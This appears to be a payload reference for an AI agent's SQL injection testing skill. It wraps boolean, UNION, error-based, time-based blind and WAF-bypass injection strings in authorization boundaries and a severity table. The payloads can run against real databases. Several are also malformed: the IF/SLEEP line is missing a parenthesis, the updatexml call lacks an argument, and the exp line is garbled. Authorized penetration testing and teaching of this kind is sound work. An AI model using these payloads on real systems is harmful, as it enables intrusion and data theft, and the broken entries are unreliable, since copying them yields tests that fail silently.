# SQL Injection Payload

> ⚠️ **Security Boundary Statement**
> 
> This document is for **authorized AppSec assessment reference** only, helping identify SQL injection vulnerability risk characteristics.
> 
> - All payloads are **technical principle demonstrations**, actual sensitive data reading prohibited
> - SQL injection payloads are for understanding attack surface only, **no database control obtained**
> - Validation proves vulnerability existence (time delay/error echo), **no sensitive data extraction**
> - UNION queries for test table reading require authorization; no credential/config reading
> - See `SKILL.md` for specific execution boundaries
> 
> **Core Principle**: Prove existence, do not enable harm

---

## Source: PayloadAllTheThings, SecLists

## Manual Testing

**Note: Maximum 8 probes**

---

## Validation Objectives (Within Security Boundary)

SQL injection vulnerability validation core objective is **proving existence**:

| Validation Content | Default | Requires Additional Authorization | Prohibited Operations |
|----------|---------|-----------|----------|
| Injection Point Confirmation | ✓ Single quote trigger error | - | UNION sensitive data reading |
| Time-based Blind Injection | ✓ `SLEEP(5)` observe delay | - | Execute database commands |
| Error-based Injection | ✓ Observe error echo | - | Read sensitive table data |
| UNION Data Reading | ❌ Not by default | ✓ UNION read test table only | Read credentials/configs |

**Safe Validation Method**: Use time delay or error echo to prove existence. UNION queries require explicit authorization and only for non-sensitive test tables.

---

## Syntax

- Single quote: `'`
- Double quote: `"`
- Comment: `--` or `#`

## Numeric Injection
```sql
1
1 AND 1=1
2-1
```

## String Injection
```sql
' AND '1'='1'--
' AND 'a'='a'--
' OR '1'='1'--
```

## UNION Injection

### Column Count Detection (Default - Safe)
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

### ⚠️ Data Extraction (Requires Authorization)

**UNION data extraction is NOT a default validation step.**

| Validation Content | Default | Requires Authorization | Prohibited |
|-------------------|---------|----------------------|------------|
| Column count detection | ✓ Safe | - | - |
| Read test table | ❌ Not by default | ✓ Explicit authorization | Read credentials |
| Read sensitive data | ❌ Prohibited | ❌ Prohibited | Credentials/config |

**Theoretical Example** (do not execute without authorization):
```sql
-- Example for understanding only - requires authorization to execute
' UNION SELECT column1,column2 FROM test_table--
-- NOT: username,password FROM users
```

## Error-based Injection
```sql
' AND extractvalue(1,concat(0x7a,version()))='1
' AND updatexml(null,concat(0x7a,version()))='1'
' AND exp(~0x7a.~length(~0x7a.~1))--
```

## Time-based Blind Injection
```sql
' AND SLEEP(5)--
' AND IF(1=1, SLEEP(5) END--
' WAITFOR DELAY '0:0:5'--
```

## Severity Classification

SQL injection severity is based on **whether data can actually be extracted** — injection point exists != exploitable. Default Low, upgrade to High only when data is confirmed extracted.

| Actual case | Severity | Note |
|---------|------|------|
| UNION/error-based extraction of real data | High | Confirmed data extraction |
| Time-based blind can extract data (bit-by-bit recovery) | High | Blind extraction succeeded |
| Time-based blind exists only (can delay but no data extracted) | Medium | Injection holds but data not exfiltrated |
| Injection point exists but blocked by WAF/parameterization, cannot extract data | Low | Defense effective |
| SQL error echo only (exposes syntax but not injectable) | Low | Information disclosure, not exploitable injection |
| Bulk database dump / many credentials retrieved (>100 records) | Critical | massive data leak |

**Key judgment**: Reporting High requires confirming **data actually retrieved** (UNION succeeds or blind injection recovered content); time delay/boolean difference only is Medium. UNION data extraction/file write is Tier 2 requiring authorization; default uses time-based blind/error echo to prove injection exists.

---

## WAF Bypass Payload
```sql
' /*!50000*/UNION/*!50000*/SELECT/**/
'/**/UNION/**/SELECT/**/
' /*!UNION*/ /*!SELECT*/--
' UnIoN SeLeCt'
```